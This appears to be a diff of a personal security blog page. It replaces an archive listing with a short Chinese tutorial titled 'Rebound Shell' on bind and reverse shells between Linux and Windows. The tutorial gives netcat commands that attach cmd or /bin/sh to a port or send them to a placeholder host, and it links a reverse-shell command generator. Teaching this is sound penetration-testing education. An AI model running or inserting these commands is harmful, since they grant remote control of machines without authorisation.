@@ -13,7 +13,7 @@
   
   <title>
     
-      Archives 
+      Rebound Shell 
       
       
       |
@@ -112,113 +112,172 @@
 
 
       <div class="flex-container">
-        <!-- 归档页，展示本站所有文章，按照年份降序归类，url形式：https://yoursite/archives/ -->
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
 
-<!-- last: 按年份把文章分组，当前遍历到的年份 -->
-<!-- now: 当前遍历到的文章的发布年份 -->
 
-<div class="container archives">
-  <div class="post-list">
-    
-        <!-- 后续文章的发布年份呈现 -->
-        <div class="content-title">
-          <h2>
-            <span>2024</span>
-          </h2>
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Rebound Shell</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-10-21 21:04:52
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Security/" title="Security">
+                    #Security
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="1-正向连接"><a href="#1-正向连接" class="headerlink" title="1. 正向连接"></a>1. 正向连接</h1><p>正向连接是指客户端主动向服务器发起连接，服务器被动地接收并处理请求。客户端知道服务器的IP地址和端口，并主动建立连接。</p>
+<p>例如实战场景：目标主机开启监听端口，等待攻击机连接。前提是目标主机的防火墙允许入站连接。</p>
+<ul>
+<li><strong>Linux 控制 Windows</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows 绑定 CMD 到 Windows 本地 5566 端口</span></span><br><span class="line">nc -e cmd -lvvp 5566</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux 主动连接 Windows 目标</span></span><br><span class="line">nc xx.xx.xx.xx 5566</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Windows 控制 Linux</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux 绑定 /bin/sh 到 Linux 本地 5566 端口</span></span><br><span class="line">ncat -e /bin/sh -lvvp 5566</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows 主动连接 Linux 目标</span></span><br><span class="line">nc xx.xx.xx.xx 5566</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="2-反向连接"><a href="#2-反向连接" class="headerlink" title="2. 反向连接"></a>2. 反向连接</h1><p>反向连接是指目标主机主动向攻击者服务器发起连接。一般在目标网络限制入站连接的情况下使用。</p>
+<p>例如实战场景：攻击机开启监听端口，等待目标主机连接。前提是目标主机能够出站。</p>
+<ul>
+<li><strong>Linux 控制 Windows</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux 本地开启 5566 端口监听</span></span><br><span class="line">nc -lvvp 5566</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows 绑定 CMD 到 Linux 的 5566 端口</span></span><br><span class="line">nc -e cmd xx.xx.xx.xx 5566</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Windows 控制 Linux</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows 本地开启 5566 端口监听</span></span><br><span class="line">nc -lvvp 5566</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux 绑定 /bin/sh 到 Windows 的 5566 端口</span></span><br><span class="line">nc -e /bin/sh xx.xx.xx.xx 5566</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="3-反弹-Shell-命令"><a href="#3-反弹-Shell-命令" class="headerlink" title="3. 反弹 Shell 命令"></a>3. 反弹 Shell 命令</h1><p>先推荐一个在线生成反弹 <code>Shell</code> 命令的网站：<a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">反弹Shell命令一键生成</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2024/10/16/Java%20ClassLoader/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-10-21 21:04:52
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Security/" title="Security">
+                        #Security
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2024/10/21/Life/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
         </div>
       
-      <div class="post-item" title="">
-        <div class="time-m-d">10-21</div>
-        <div class="title">
-          <a href="/2024/10/21/Life/">
-            <span></span>
-          </a>
-        </div>
-      </div>
+    </div>
     
-      <div class="post-item" title="Rebound Shell">
-        <div class="time-m-d">10-20</div>
-        <div class="title">
-          <a href="/2024/10/20/Rebound%20Shell/">
-            <span>Rebound Shell</span>
-          </a>
-        </div>
-      </div>
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-text">1. 正向连接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-text">2. 反向连接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%8F%8D%E5%BC%B9-Shell-%E5%91%BD%E4%BB%A4"><span class="toc-text">3. 反弹 Shell 命令</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
     
-      <div class="post-item" title="Java ClassLoader">
-        <div class="time-m-d">10-16</div>
-        <div class="title">
-          <a href="/2024/10/16/Java%20ClassLoader/">
-            <span>Java ClassLoader</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Java Deserialization - URLDNS">
-        <div class="time-m-d">10-15</div>
-        <div class="title">
-          <a href="/2024/10/15/Java%20Deserialization%20URLDNS/">
-            <span>Java Deserialization - URLDNS</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Java Deserialization">
-        <div class="time-m-d">10-14</div>
-        <div class="title">
-          <a href="/2024/10/14/Java%20Deserialization/">
-            <span>Java Deserialization</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Java Proxy Pattern">
-        <div class="time-m-d">10-13</div>
-        <div class="title">
-          <a href="/2024/10/13/Java%20Proxy%20Pattern/">
-            <span>Java Proxy Pattern</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Java Reflection">
-        <div class="time-m-d">10-11</div>
-        <div class="title">
-          <a href="/2024/10/11/Java%20Reflection/">
-            <span>Java Reflection</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Java I/O Stream">
-        <div class="time-m-d">10-10</div>
-        <div class="title">
-          <a href="/2024/10/10/Java%20IO%20Stream/">
-            <span>Java I/O Stream</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Java Memory Shell">
-        <div class="time-m-d">10-10</div>
-        <div class="title">
-          <a href="/2024/10/10/Java%20Memory%20Shell/">
-            <span>Java Memory Shell</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Hello World">
-        <div class="time-m-d">10-09</div>
-        <div class="title">
-          <a href="/2024/10/09/hello-world/">
-            <span>Hello World</span>
-          </a>
-        </div>
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
       </div>
     
   </div>
-</div>
+
 
         
 <div class="footer">
@@ -475,6 +534,24 @@
 
 
         
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Rebound%20Shell + '&url=' + https%3A%2F%2Fb1ng0ooo.github.io%2F2024%2F10%2F20%2FRebound%2520Shell%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://b1ng0ooo.github.io/2024/10/20/Rebound%20Shell/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
   
   
 <script src="/js/shares.js"></script>
